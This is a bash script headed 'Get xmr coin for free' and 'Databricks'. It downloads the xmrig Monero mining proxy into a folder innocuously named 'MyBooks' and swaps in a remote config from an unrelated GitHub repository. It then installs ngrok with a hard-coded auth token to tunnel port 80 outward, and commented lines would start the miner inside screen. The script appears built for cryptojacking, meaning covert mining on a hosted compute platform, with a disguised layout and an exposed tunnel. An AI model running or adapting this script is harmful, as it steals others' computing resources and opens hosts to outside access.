#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
sudo apt install screen
clear

cd
mkdir MyBooks
cd MyBooks
wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.15.1/xmrig-proxy-6.15.1-focal-x64.tar.gz

tar xvzf xmrig-proxy-6.15.1-focal-x64.tar.gz
cd xmrig-proxy-6.15.1
rm config.json
wget https://raw.githubusercontent.com/Novabooks21/CoolBooks2/main/MainData/P/config.json
cd ~/MyBooks

wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz
tar xvzf ngrok-stable-linux-amd64.tgz

./ngrok authtoken 27O2k1giCQIjgVbuZu8mfqOd7B7_4GDCcFMXw91maTA77AxjL
./ngrok http 80

#xdotool key --window "$id" alt+r

#cd ~/MyBooks/xmrig-proxy-6.15.1

#screen -R xmr
#./xmrig
